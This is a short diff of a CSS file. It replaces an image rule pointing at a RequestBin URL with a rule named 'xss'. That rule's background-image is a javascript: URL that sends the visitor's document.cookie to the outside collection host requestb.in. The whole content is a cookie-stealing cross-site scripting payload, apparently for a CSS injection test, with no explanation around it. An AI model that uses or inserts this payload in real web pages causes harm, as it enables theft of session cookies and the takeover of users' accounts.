@@ -1,3 +1,3 @@
-img {
-  content: url("http://requestb.in/15uq49d1");
+xss {
+    background-image:url('javascript:new Image().src="http://requestb.in/15uq49d1?c="+encodeURI(document.cookie);');
 }
